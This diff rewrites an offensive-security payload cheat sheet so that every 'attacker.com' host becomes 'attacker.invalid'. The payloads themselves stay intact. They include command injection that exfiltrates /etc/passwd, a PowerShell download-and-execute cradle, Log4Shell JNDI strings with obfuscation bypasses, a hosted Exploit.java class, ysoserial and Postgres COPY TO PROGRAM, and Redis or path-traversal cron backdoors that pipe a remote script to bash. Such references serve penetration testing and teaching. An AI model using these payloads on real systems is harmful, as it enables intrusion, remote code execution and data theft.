@@ -83,7 +83,7 @@ if the application doesn't limit which file the user includes with the page para
 and then they can run commands:
 
 ```http
-http://example.com/?page=http://attacker.com/malicious.php?cmd=ls
+http://example.com/?page=http://attacker.invalid/malicious.php?cmd=ls
 ```
 
 ### Command Injection
@@ -159,9 +159,9 @@ $(whoami)
 || ping -c 10 127.0.0.1
 
 # Out-of-band (OAST)
-; nslookup $(whoami).attacker.com
-; curl http://attacker.com/$(whoami)
-; wget http://attacker.com/?data=$(cat /etc/passwd | base64)
+; nslookup $(whoami).attacker.invalid
+; curl http://attacker.invalid/$(whoami)
+; wget http://attacker.invalid/?data=$(cat /etc/passwd | base64)
 
 # Space bypasses
 cat</etc/passwd
@@ -202,11 +202,11 @@ a=w;b=hoami;$a$b
 & timeout /t 10
 
 # OAST
-& nslookup %USERNAME%.attacker.com
-& certutil -urlcache -split -f http://attacker.com/beacon
+& nslookup %USERNAME%.attacker.invalid
+& certutil -urlcache -split -f http://attacker.invalid/beacon
 
 # PowerShell execution
-& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.invalid/shell.ps1')"
 ```
 
 #### Server-Side Template Injection (SSTI) Payloads
@@ -402,7 +402,7 @@ Runtime.getRuntime().exec("whoami");
 
 ```bash
 # Generate payload
-java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/beacon' | base64
+java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.invalid/beacon' | base64
 
 # Popular gadget chains
 ysoserial CommonsCollections1
@@ -548,7 +548,7 @@ systeminfo (Windows)
 echo "pwned_by_researcher" > /tmp/proof.txt
 
 # Time-based confirmation
-sleep 10 && curl http://attacker.com/confirmed
+sleep 10 && curl http://attacker.invalid/confirmed
 ```
 
 **Practical Tactics:**
@@ -656,7 +656,7 @@ evil/
 ```
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(https://attacker.com/shell.jpg"|whoami")'
+fill 'url(https://attacker.invalid/shell.jpg"|whoami")'
 pop graphic-context
 ```
 
@@ -739,44 +739,44 @@ Hello World
 **Basic Payloads:**
 
 ```bash
-${jndi:ldap://attacker.com/a}
-${jndi:rmi://attacker.com/a}
-${jndi:dns://attacker.com/a}
+${jndi:ldap://attacker.invalid/a}
+${jndi:rmi://attacker.invalid/a}
+${jndi:dns://attacker.invalid/a}
 
 # Common injection points
-User-Agent: ${jndi:ldap://attacker.com/a}
-X-Api-Version: ${jndi:ldap://attacker.com/a}
-Referer: ${jndi:ldap://attacker.com/a}
+User-Agent: ${jndi:ldap://attacker.invalid/a}
+X-Api-Version: ${jndi:ldap://attacker.invalid/a}
+Referer: ${jndi:ldap://attacker.invalid/a}
 ```
 
 **Obfuscation Bypasses:**
 
 ```bash
 # Lowercase/uppercase
-${${lower:j}ndi:ldap://attacker.com/a}
-${${upper:j}ndi:ldap://attacker.com/a}
+${${lower:j}ndi:ldap://attacker.invalid/a}
+${${upper:j}ndi:ldap://attacker.invalid/a}
 
 # Environment variables
-${j${env:NOTHING:-n}di:ldap://attacker.com/a}
+${j${env:NOTHING:-n}di:ldap://attacker.invalid/a}
 
 # Nested lookups
-${jnd${sys:java.version:-i}:ldap://attacker.com/a}
+${jnd${sys:java.version:-i}:ldap://attacker.invalid/a}
 
 # Multiple levels
-${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.invalid/a}
 ```
 
 **Setup LDAP server for exploitation:**
 
 ```bash
 # Using marshalsec
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.invalid/#Exploit" 1389
 
 # Exploit.java - compile and host
 public class Exploit {
     static {
         try {
-            Runtime.getRuntime().exec("curl http://attacker.com/pwned");
+            Runtime.getRuntime().exec("curl http://attacker.invalid/pwned");
         } catch (Exception e) {}
     }
 }
@@ -819,7 +819,7 @@ public class Exploit {
 
 ```
 # Playlist SSRF
-concat:http://attacker.com/playlist|file:///etc/passwd
+concat:http://attacker.invalid/playlist|file:///etc/passwd
 
 # HLS SSRF
 #EXTM3U
@@ -855,7 +855,7 @@ SELECT sys_exec('whoami');
 
 ```sql
 -- COPY TO PROGRAM (9.3+)
-COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/beacon';
+COPY (SELECT '') TO PROGRAM 'curl http://attacker.invalid/beacon';
 
 -- Large Object + lo_export
 SELECT lo_create(-1);
@@ -912,7 +912,7 @@ PUT /upload?path=../../.ssh/authorized_keys
 
 # Overwrite cron job
 PUT /upload?path=../../etc/cron.d/backdoor
-Content: * * * * * root curl http://attacker.com/shell.sh | bash
+Content: * * * * * root curl http://attacker.invalid/shell.sh | bash
 
 # Overwrite bash profile
 PUT /upload?path=../../.bashrc
@@ -935,7 +935,7 @@ http://internal:8080/admin/exec?cmd=whoami
 http://localhost:6379
 CONFIG SET dir /etc/cron.d/
 CONFIG SET dbfilename root
-SET 1 "* * * * * root curl http://attacker.com/shell.sh | bash"
+SET 1 "* * * * * root curl http://attacker.invalid/shell.sh | bash"
 SAVE
 ```
 
@@ -950,7 +950,7 @@ SAVE
 
 # XXE + JAR protocol (Java)
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "jar:http://attacker.com/malicious.jar!/payload.class">
+  <!ENTITY xxe SYSTEM "jar:http://attacker.invalid/malicious.jar!/payload.class">
 ]>
 ```
 
